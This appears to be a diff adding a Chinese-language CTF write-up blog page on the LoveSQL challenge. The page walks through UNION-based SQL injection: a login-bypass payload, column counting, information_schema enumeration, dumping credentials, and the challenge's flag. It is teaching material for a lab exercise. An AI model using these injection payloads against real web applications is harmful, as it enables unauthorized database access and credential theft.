@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/6.1.14/fancybox/fancybox.css" integrity="sha256-mdaMxrItEW6hMIVJJNPKuX0B7KCSJQVEv3mVY4N2we4=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"quellisya.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":true,"version":"8.29.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"language":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="登录只是开始。用 order by 定列数、找回收显位，再用 UNION SELECT 依次爆库、爆表、爆字段，最后把 flag 拖出来。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[极客大挑战 2019] LoveSQL：UNION 注入的完整流程">
+<meta property="og:url" content="https://quellisya.github.io/2026/10/22/web-ctf-sql-lovesql/index.html">
+<meta property="og:site_name" content="Quellisya&#39;s Blog">
+<meta property="og:description" content="登录只是开始。用 order by 定列数、找回收显位，再用 UNION SELECT 依次爆库、爆表、爆字段，最后把 flag 拖出来。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://quellisya.github.io/2026/10/22/web-ctf-sql-lovesql/06-lovesql-login.png">
+<meta property="og:image" content="https://quellisya.github.io/2026/10/22/web-ctf-sql-lovesql/07-lovesql-admin.png">
+<meta property="og:image" content="https://quellisya.github.io/2026/10/22/web-ctf-sql-lovesql/09-column-count-error.png">
+<meta property="og:image" content="https://quellisya.github.io/2026/10/22/web-ctf-sql-lovesql/11-union-echo.png">
+<meta property="og:image" content="https://quellisya.github.io/2026/10/22/web-ctf-sql-lovesql/12-database-names.png">
+<meta property="og:image" content="https://quellisya.github.io/2026/10/22/web-ctf-sql-lovesql/15-table-names.png">
+<meta property="og:image" content="https://quellisya.github.io/2026/10/22/web-ctf-sql-lovesql/13-column-names.png">
+<meta property="og:image" content="https://quellisya.github.io/2026/10/22/web-ctf-sql-lovesql/16-dump-result.png">
+<meta property="article:published_time" content="2026-10-22T13:10:00.000Z">
+<meta property="article:modified_time" content="2026-10-28T12:30:00.000Z">
+<meta property="article:author" content="Quellisya">
+<meta property="article:tag" content="SQL 注入">
+<meta property="article:tag" content="UNION 注入">
+<meta property="article:tag" content="information_schema">
+<meta property="article:tag" content="极客大挑战">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://quellisya.github.io/2026/10/22/web-ctf-sql-lovesql/06-lovesql-login.png">
+
+
+<link rel="canonical" href="https://quellisya.github.io/2026/10/22/web-ctf-sql-lovesql/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://quellisya.github.io/2026/10/22/web-ctf-sql-lovesql/","path":"/2026/10/22/web-ctf-sql-lovesql/","title":"[极客大挑战 2019] LoveSQL：UNION 注入的完整流程"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>[极客大挑战 2019] LoveSQL：UNION 注入的完整流程 | Quellisya's Blog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/6.1.14/fancybox/fancybox.umd.js" integrity="sha256-QnJV4HT5r8i89ovZGRD86iynZqHerEbT2xt69vDM36I=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/7.2.1/pangu.umd.js" integrity="sha256-kRsxecBnwG6mULFPe2E6UKnNm8XfDOuDwCOprjLZuX8=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script><script src="/js/pjax.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js" defer></script>
+
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","display_overflow":"scroll","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/4.1.3/tex-mml-chtml.js","integrity":"sha256-ihPtDDm7pTmSF9ViEsItlvsrBTsNkz0MOXMchzOwCQw="}}</script>
+<script src="/js/third-party/math/mathjax.js" defer></script>
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="Quellisya's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Quellisya's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">CTF · Web Security · Writeups</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-rss"><a href="/atom.xml" rel="section"><i class="fa fa-rss fa-fw"></i>RSS</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8C%E6%A0%B7%E7%9A%84%E5%85%A5%E5%8F%A3%EF%BC%8C%E5%85%88%E7%99%BB%E5%BD%95%E8%BF%9B%E5%8E%BB"><span class="nav-number">1.</span> <span class="nav-text">同样的入口，先登录进去</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E6%95%B0%E6%B8%85%E6%A5%9A%E5%8E%9F%E6%9D%A5%E6%9F%A5%E4%BA%86%E5%87%A0%E5%88%97"><span class="nav-number">2.</span> <span class="nav-text">第二步：数清楚原来查了几列</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E7%88%86%E5%87%BA%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="nav-number">3.</span> <span class="nav-text">第三步：爆出数据库名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E7%88%86%E5%87%BA%E8%A1%A8%E5%90%8D"><span class="nav-number">4.</span> <span class="nav-text">第四步：爆出表名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E7%88%86%E5%87%BA%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="nav-number">5.</span> <span class="nav-text">第五步：爆出字段名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E5%85%AD%E6%AD%A5%EF%BC%9A%E6%8A%8A%E6%95%B0%E6%8D%AE%E6%8B%96%E5%87%BA%E6%9D%A5"><span class="nav-number">6.</span> <span class="nav-text">第六步：把数据拖出来</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Quellisya</p>
+  <div class="site-description" itemprop="description">记录 CTF、Web 安全的学习笔记与 Writeup，尽量把每一步讲清楚。</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">23</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://quellisya.github.io/2026/10/22/web-ctf-sql-lovesql/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Quellisya">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Quellisya's Blog">
+      <meta itemprop="description" content="记录 CTF、Web 安全的学习笔记与 Writeup，尽量把每一步讲清楚。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="[极客大挑战 2019] LoveSQL：UNION 注入的完整流程 | Quellisya's Blog">
+      <meta itemprop="description" content="登录只是开始。用 order by 定列数、找回收显位，再用 UNION SELECT 依次爆库、爆表、爆字段，最后把 flag 拖出来。">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [极客大挑战 2019] LoveSQL：UNION 注入的完整流程
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-10-22 21:10:00" itemprop="dateCreated datePublished" datetime="2026-10-22T21:10:00+08:00">2026-10-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-10-28 20:30:00" itemprop="dateModified" datetime="2026-10-28T20:30:00+08:00">2026-10-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/web/sql-injection/" itemprop="url" rel="index"><span itemprop="name">SQL 注入</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">登录只是开始。用 order by 定列数、找回收显位，再用 UNION SELECT 依次爆库、爆表、爆字段，最后把 flag 拖出来。</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+<nav class="series-nav">
+  <div class="series-nav__head">
+    <i class="fa fa-layer-group"></i>
+    <span class="series-nav__name">系列：SQL 注入</span>
+    <span class="series-nav__count">第 3 / 4 篇</span>
+  </div>
+  <ol class="series-nav__list"><li><a href="&#x2F;2026&#x2F;10&#x2F;22&#x2F;web-knowledge-sql-basics&#x2F;">SQL 注入基础：原理、流程速查与防护</a></li><li><a href="&#x2F;2026&#x2F;10&#x2F;22&#x2F;web-ctf-sql-easysql-geek&#x2F;">[极客大挑战 2019] EasySQL：从一个单引号到万能密码</a></li><li class="is-current"><a href="&#x2F;2026&#x2F;10&#x2F;22&#x2F;web-ctf-sql-lovesql&#x2F;">[极客大挑战 2019] LoveSQL：UNION 注入的完整流程</a></li><li><a href="&#x2F;2026&#x2F;10&#x2F;22&#x2F;web-ctf-sql-easysql-suctf&#x2F;">[SUCTF 2019] EasySQL：黑名单、堆叠注入与反推源码</a></li></ol>
+  <div class="series-nav__links"><a class="series-nav__prev" href="&#x2F;2026&#x2F;10&#x2F;22&#x2F;web-ctf-sql-easysql-geek&#x2F;"><i class="fa fa-arrow-left"></i>[极客大挑战 2019] EasySQL：从一个单引号到万能密码</a><a class="series-nav__next" href="&#x2F;2026&#x2F;10&#x2F;22&#x2F;web-ctf-sql-easysql-suctf&#x2F;">[SUCTF 2019] EasySQL：黑名单、堆叠注入与反推源码<i class="fa fa-arrow-right"></i></a></div>
+</nav><h2 id="同样的入口，先登录进去"><a href="#同样的入口，先登录进去" class="headerlink" title="同样的入口，先登录进去"></a>同样的入口，先登录进去</h2><p>LoveSQL 的登录页和<a href="/2026/10/22/web-ctf-sql-easysql-geek/">上一篇 EasySQL</a>风格一致：</p>
+<p><img src="/2026/10/22/web-ctf-sql-lovesql/06-lovesql-login.png" alt="LoveSQL 登录页面"></p>
+<p><em>图 6：LoveSQL 登录页</em></p>
+<p>沿用上一篇的万能密码 <code>1&#39;||1#</code>：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">基础地址：http://01fc6bfe26018717c5512075.http-ctf2.dasctf.com/check.php</span><br><span class="line">查询参数：?username=1%27%7C%7C1%23&amp;password=1</span><br></pre></td></tr></table></figure>
+
+<p>登录成功，但这次页面没有直接给 flag，只回显了管理员信息：</p>
+<p><img src="/2026/10/22/web-ctf-sql-lovesql/07-lovesql-admin.png" alt="LoveSQL 登录成功"></p>
+<p><em>图 7：<code>Hello admin! Your password is &#39;3c97440bd844baefe62761d8c840cb3f&#39;</code></em></p>
+<p>那串 32 位字符串是 MD5，不是 flag。页面上方还写着”这次我把它们放在了那个地方”，说明 flag 被藏在了数据库里，需要继续查询。</p>
+<div class="note info"><p><code>Hello admin!</code> 和 <code>Your password is &#39;...&#39;</code> 这两个位置非常关键——它们是页面会<strong>回显</strong>的字段。后面做 <code>UNION SELECT</code> 时，要正好把数据放在这两个位置上。</p>
+</div>
+
+<h2 id="第二步：数清楚原来查了几列"><a href="#第二步：数清楚原来查了几列" class="headerlink" title="第二步：数清楚原来查了几列"></a>第二步：数清楚原来查了几列</h2><p><code>UNION</code> 要求前后两个查询的<strong>列数完全一致</strong>，所以先确定原查询有几列。</p>
+<p><strong>方法一：<code>ORDER BY</code>（推荐）</strong></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 3#</span><br><span class="line">1&#x27; order by 4#</span><br></pre></td></tr></table></figure>
+
+<p><code>order by 3</code> 正常、<code>order by 4</code> 报错，说明原查询是 3 列。</p>
+<p><strong>方法二：直接 <code>UNION SELECT</code></strong></p>
+<p>先猜 1 列：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1#</span><br></pre></td></tr></table></figure>
+
+<p>页面报错：</p>
+<p><img src="/2026/10/22/web-ctf-sql-lovesql/09-column-count-error.png" alt="列数不一致报错"></p>
+<p><em>图 8：<code>The used SELECT statements have a different number of columns</code></em></p>
+<p>再试 3 列：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,2,3#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/10/22/web-ctf-sql-lovesql/11-union-echo.png" alt="UNION 3 列成功"></p>
+<p><em>图 9：<code>Hello 2! Your password is &#39;3&#39;</code></em></p>
+<p>页面显示 <code>Hello 2!</code>、<code>Your password is &#39;3&#39;</code>，说明：</p>
+<ul>
+<li>原查询确实是 <strong>3 列</strong>；</li>
+<li>第 1 列不显示；</li>
+<li><strong>第 2 列会显示在 <code>Hello</code> 后面，第 3 列会显示在 <code>Your password is</code> 后面</strong>。</li>
+</ul>
+<p>这两列就是我们的”回显位”，后面的查询把数据放到第 2、3 列即可。</p>
+<div class="note warning"><p>如果 <code>UNION</code> 报的是列数错误，先不要怀疑 payload 写错，优先检查逗号数量和列数是否对应。原查询有 3 列，<code>union select</code> 也必须写 3 个值。</p>
+</div>
+
+<h2 id="第三步：爆出数据库名"><a href="#第三步：爆出数据库名" class="headerlink" title="第三步：爆出数据库名"></a>第三步：爆出数据库名</h2><p>先看当前数据库叫什么：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,database(),3#</span><br></pre></td></tr></table></figure>
+
+<p>如果想把所有数据库都列出来，就查 <code>information_schema.schemata</code>：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,group_concat(schema_name),3 from information_schema.schemata#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/10/22/web-ctf-sql-lovesql/12-database-names.png" alt="数据库名列表"></p>
+<p><em>图 10：<code>information_schema,performance_schema,test,mysql,geek</code></em></p>
+<p>其中 <code>geek</code> 就是当前业务数据库。<code>information_schema</code> 是 MySQL 自带的”元数据库”，里面存着所有库、表、字段的信息，是我们后续爆表、爆字段的关键。</p>
+<h2 id="第四步：爆出表名"><a href="#第四步：爆出表名" class="headerlink" title="第四步：爆出表名"></a>第四步：爆出表名</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,group_concat(table_name),3</span><br><span class="line">from information_schema.tables</span><br><span class="line">where table_schema=database()#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/10/22/web-ctf-sql-lovesql/15-table-names.png" alt="表名列表"></p>
+<p><em>图 11：当前库中有 <code>geekuser</code> 和 <code>l0ve1ysq1</code> 两张表</em></p>
+<p><code>l0ve1ysq1</code> 这个名字明显是出题人留的线索（love + sql），flag 大概率在这张表里。</p>
+<h2 id="第五步：爆出字段名"><a href="#第五步：爆出字段名" class="headerlink" title="第五步：爆出字段名"></a>第五步：爆出字段名</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,group_concat(column_name),3</span><br><span class="line">from information_schema.columns</span><br><span class="line">where table_schema=database() and table_name=&#x27;l0ve1ysq1&#x27;#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/10/22/web-ctf-sql-lovesql/13-column-names.png" alt="字段名列表"></p>
+<p><em>图 12：字段为 <code>id,username,password</code></em></p>
+<div class="note info"><p>如果去掉 <code>and table_name=&#39;l0ve1ysq1&#39;</code> 这个条件，会把 <code>geekuser</code> 和 <code>l0ve1ysq1</code> 两张表的字段一起查出来，于是看到 <code>id,username,password,id,username,password</code> 这样重复的结果——这不是报错，只是两张表字段名恰好一样。</p>
+</div>
+
+<h2 id="第六步：把数据拖出来"><a href="#第六步：把数据拖出来" class="headerlink" title="第六步：把数据拖出来"></a>第六步：把数据拖出来</h2><p>知道了表名和字段名，直接查：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,group_concat(username,0x3a,password),3 from l0ve1ysq1#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/10/22/web-ctf-sql-lovesql/16-dump-result.png" alt="拖库结果"></p>
+<p><em>图 13：所有用户名和密码被拼成一行显示</em></p>
+<p>这里用到了两个小技巧：</p>
+<ul>
+<li><code>group_concat()</code>：把多行结果合并成一行，避免页面只显示第一条；</li>
+<li><code>0x3a</code>：十六进制形式的冒号 <code>:</code>，用来分隔用户名和密码。直接在单引号里写 <code>&#39;:&#39;</code> 容易和闭合引号打架，用十六进制更省事。</li>
+</ul>
+<p>结果里已经能看到 flag 的尾巴：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...3984-4c7b-882a-6d9f50b61de1&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于页面宽度有限，长字符串可能被 CSS 截断。<strong>按 F12 打开开发者工具</strong>，在 Elements 面板查看对应文本，或者直接在 Console 里执行 <code>document.body.innerText</code> 复制完整内容即可。</p>
+<p>完整 flag：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF2&#123;d4518a67-3984-4c7b-882a-6d9f50b61de1&#125;</span><br></pre></td></tr></table></figure>
+
+<div class="note info"><p>如果只想拿 flag，可以更精准一点，直接用条件过滤，避免在一堆数据里找：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,username,password from l0ve1ysq1 where password like &#x27;CTF2%&#x27;#</span><br></pre></td></tr></table></figure></div>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/SQL-%E6%B3%A8%E5%85%A5/" rel="tag"># SQL 注入</a>
+              <a href="/tags/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/" rel="tag"># 极客大挑战</a>
+              <a href="/tags/UNION-%E6%B3%A8%E5%85%A5/" rel="tag"># UNION 注入</a>
+              <a href="/tags/information-schema/" rel="tag"># information_schema</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/10/22/web-ctf-sql-easysql-geek/" rel="prev" title="[极客大挑战 2019] EasySQL：从一个单引号到万能密码">
+                  <i class="fa fa-angle-left"></i> [极客大挑战 2019] EasySQL：从一个单引号到万能密码
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2026/10/22/web-ctf-sql-easysql-suctf/" rel="next" title="[SUCTF 2019] EasySQL：黑名单、堆叠注入与反推源码">
+                  [SUCTF 2019] EasySQL：黑名单、堆叠注入与反推源码 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Quellisya</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/Quellisya" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
